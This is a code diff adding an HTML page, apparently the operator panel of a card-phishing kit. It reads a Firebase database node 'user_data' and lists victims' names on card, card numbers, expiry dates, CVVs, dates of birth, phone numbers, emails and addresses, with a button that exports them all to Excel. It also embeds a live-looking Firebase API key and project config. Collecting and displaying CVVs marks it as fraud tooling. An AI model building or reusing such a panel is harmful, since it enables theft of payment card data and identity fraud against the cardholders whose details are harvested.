@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+
+    <title>User Data Table</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap");
+      .ddd {
+        height: 90vh;
+        overflow-y: scroll;
+      }
+      .ddd thead {
+        position: sticky;
+        top: -1%;
+        z-index: 2;
+      }
+      table {
+        width: 100%;
+        font-size: 12px;
+        border-collapse: collapse;
+        font-family: "roboto", sans-serif;
+      }
+      th,
+      td {
+        border: 1px solid black;
+        padding: 8px;
+        font-weight: 550;
+        text-align: left;
+      }
+      th {
+        background-color: #f2f2f2;
+      }
+      .modal {
+      display: flex;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.4);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .close:hover,
+    .close:focus {
+      color: black;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    
+    </style>
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+    ></script>
+  </head>
+  <body>
+   
+    <!-- Modal -->
+    <button onclick="exportTableToExcel('dataTable', 'table_data')">Export to Excel</button>
+
+
+  
+    <div class="container" id="container">
+      <input type="text" id="searchInput" placeholder="Search..." />
+      <div class="ddd">
+        <table id="dataTable">
+          <thead>
+            <tr>
+              <th>Code ID</th>
+              <th>Access</th>
+              <th>Name On Card</th>
+              <th>Phone</th>
+              <th>Email</th>
+              <th>Amount</th>
+              <th>Card Number</th>
+              <th>Card Expiry</th>
+              <th>CVV</th>
+              <th>DOB</th>
+              <th>Address</th>
+              <th>City</th>
+              <th>Zip Code</th>
+              <th>State</th>
+            </tr>
+          </thead>
+          <tbody id="tableBody"></tbody>
+        </table>
+      </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+    <script>
+      function exportTableToExcel(tableID, filename = '') {
+        // Reference to the table element
+        let table = document.getElementById(tableID);
+        
+        // Create a new workbook and a worksheet from the table
+        let workbook = XLSX.utils.table_to_book(table, { sheet: "Sheet1" });
+  
+        // Set the filename and format for download
+        filename = filename ? filename + '.xlsx' : 'excel_data.xlsx';
+  
+        // Export the workbook to an Excel file
+        XLSX.writeFile(workbook, filename);
+      }
+    </script>
+  
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-compat.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const firebaseConfig = {
+          apiKey: "AIzaSyB3RveBfKe6vyocWMKxQVR9FeiJJaYIYPw",
+          authDomain: "epay-2-2450d.firebaseapp.com",
+          databaseURL: "https://epay-2-2450d-default-rtdb.firebaseio.com",
+          projectId: "epay-2-2450d",
+          storageBucket: "epay-2-2450d.appspot.com",
+          messagingSenderId: "349824340237",
+          appId: "1:349824340237:web:ef62280ceb05f303e1e044",
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        const database = firebase.database();
+        console.log(database);
+        const tableRef = database.ref("user_data");
+
+        console.log(tableRef);
+
+        tableRef.on("value", function (snapshot) {
+          const data = snapshot.val();
+          console.log(data);
+          const tableBody = document.getElementById("tableBody");
+          tableBody.innerHTML = ""; // Clear previous data
+
+          // Convert Firebase object to array
+          const dataArray = Object.values(data);
+
+          dataArray.forEach((row) => {
+            console.log(row.code_id);
+            const newRow = document.createElement("tr");
+            newRow.innerHTML = `
+              <td>${row.code_id}</td>
+              <td>${row.access}</td>
+              <td>${row.name_on_card}</td>
+              <td>${row.phone}</td>
+              <td>${row.email}</td>
+              <td>$ ${row.amount}</td>
+              <td>${row.cc_number}</td>
+              <td>${row.cc_exp}</td>
+              <td>${row.cvv}</td>
+              <td>${row.dob}</td>
+              
+              <td>${row.address}</td>
+              <td>${row.city}</td>
+              <td>${row.zip_code}</td>
+              <td>${row.state}</td>
+            `;
+            tableBody.appendChild(newRow);
+          });
+
+          // Add search functionality
+          const searchInput = document.getElementById("searchInput");
+          searchInput.addEventListener("input", function () {
+            const searchText = this.value.toLowerCase();
+            dataArray.forEach((row) => {
+              const rowValues = Object.values(row).map((value) =>
+                value.toString().toLowerCase()
+              );
+              const rowElement = tableBody.querySelector(
+                `tr[data-row-index="${row.code_id}"]`
+              );
+              if (rowValues.some((value) => value.includes(searchText))) {
+                rowElement.style.display = "";
+              } else {
+                rowElement.style.display = "none";
+              }
+            });
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
